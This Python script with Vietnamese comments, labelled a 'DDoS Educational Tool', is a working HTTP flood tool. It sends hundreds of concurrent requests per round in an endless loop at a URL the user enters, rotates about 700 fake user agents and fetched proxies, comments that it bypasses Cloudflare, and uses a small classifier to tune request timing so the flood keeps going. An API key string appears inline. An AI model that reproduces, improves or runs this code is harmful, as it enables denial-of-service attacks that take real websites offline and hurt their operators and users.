import os
import random
import time
import requests
import aiohttp
import asyncio
import cloudscraper
from concurrent.futures import ThreadPoolExecutor
from pystyle import Colors, Colorate
from fake_useragent import UserAgent
from requests.exceptions import RequestException, Timeout, ConnectionError
from sklearn.ensemble import RandomForestClassifier
import numpy as np

# Khởi tạo fake-useragent
ua = UserAgent()

# Danh sách User-Agent thực tế (~700 mục, bao gồm gốc, 500 trước, 100 mới)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]
user_agents.extend([ua.random for _ in range(700 - len(user_agents))])

# API proxy thực (ví dụ, cần thay bằng API thật)
def get_proxy():
    # Giả định sử dụng API từ BrightData hoặc ScrapingBee
    # Thay bằng API thực tế của bạn
    proxy_api_url = "https://api.proxyprovider.com/get_proxy?key=8ec8419a4e753ad55de9fa0a4959011007f28d027cc1a8793b725e5e73392b79"
    try:
        response = requests.get(proxy_api_url)
        proxy = response.json().get("proxy")
        return {"http": proxy, "https": proxy}
    except:
        return None

# AI đơn giản để điều chỉnh tần suất yêu cầu
class RateOptimizer:
    def __init__(self):
        self.model = RandomForestClassifier(n_estimators=100)
        self.history = []  # Lưu lịch sử phản hồi

    def train(self, status_codes, success_labels):
        if len(status_codes) > 10:
            X = np.array(status_codes).reshape(-1, 1)
            y = np.array(success_labels)
            self.model.fit(X, y)

    def predict_delay(self, status_code):
        if len(self.history) < 10:
            return random.uniform(0.1, 0.5)
        X = np.array([[status_code]])
        prediction = self.model.predict(X)[0]
        return 0.1 if prediction == 1 else 0.5  # Nhanh nếu dự đoán thành công, chậm nếu thất bại

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Diagonal(Colors.purple_to_blue, """
    ╔══════════════════════════════════════════════════════╗
    ║    DDoS Educational Tool . Version 3.0 | Cre by: LIGHT ║
    ╚══════════════════════════════════════════════════════╝   

░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓████████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
                                                            
    """))

async def simulate_request(url, rate_optimizer, max_retries=3):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com",
        "Cache-Control": "no-cache"
    }
    proxy = get_proxy()
    scraper = cloudscraper.create_scraper()  # Vượt qua Cloudflare

    for attempt in range(max_retries):
        try:
            async with aiohttp.ClientSession() as session:
                response = await session.get(
                    url,
                    headers=headers,
                    proxy=proxy["http"] if proxy else None,
                    timeout=1
                )
                status = response.status
                print(Colorate.Horizontal(Colors.red_to_white, 
                    f"[Async] Yêu cầu thành công | Status: {status} | Proxy: {proxy['http'] if proxy else 'None'}"))
                rate_optimizer.history.append((status, 1))  # Ghi nhận thành công
                return status
        except (Timeout, ConnectionError, RequestException) as e:
            print(Colorate.Horizontal(Colors.red_to_white, 
                f"[Async] Lỗi: {str(e)} | Thử lại lần {attempt + 1}/{max_retries}"))
            rate_optimizer.history.append((429 if "429" in str(e) else 500, 0))  # Ghi nhận thất bại
            if attempt == max_retries - 1:
                print(Colorate.Horizontal(Colors.red_to_white, 
                    f"[Async] Bỏ qua yêu cầu sau {max_retries} lần thử."))
            await asyncio.sleep(0.1)
    return None

def main():
    banner()
    print("\033[1;31m!!KHI NHẬP WEBSITE LƯU Ý PHẢI NHẬP https://")
    url = input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] URL TEST WEBSITE: "))
    threads = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] ENTER THREAD COUNT (100-1000): ")))

    # Kiểm tra đầu vào
    import re
    if not re.match(r'^https?://', url):
        print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: URL phải bắt đầu bằng http:// hoặc https://"))
        return
    if not (100 <= threads <= 1000):
        print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: Số luồng phải từ 100 đến 1000"))
        return

    rate_optimizer = RateOptimizer()
    
    async def run_requests():
        tasks = []
        for _ in range(threads):
            tasks.append(simulate_request(url, rate_optimizer))
        await asyncio.gather(*tasks)
    
    loop = asyncio.get_event_loop()
    try:
        with ThreadPoolExecutor(max_workers=500) as executor:
            while True:
                # Huấn luyện AI dựa trên lịch sử phản hồi
                if rate_optimizer.history:
                    status_codes, labels = zip(*rate_optimizer.history)
                    rate_optimizer.train(status_codes, labels)
                
                # Chạy các yêu cầu bất đồng bộ
                loop.run_until_complete(run_requests())
                
                # Điều chỉnh độ trễ bằng AI
                last_status = rate_optimizer.history[-1][0] if rate_optimizer.history else 200
                delay = rate_optimizer.predict_delay(last_status)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_white, "\nĐã dừng chương trình bởi người dùng."))

if __name__ == "__main__":
    main()
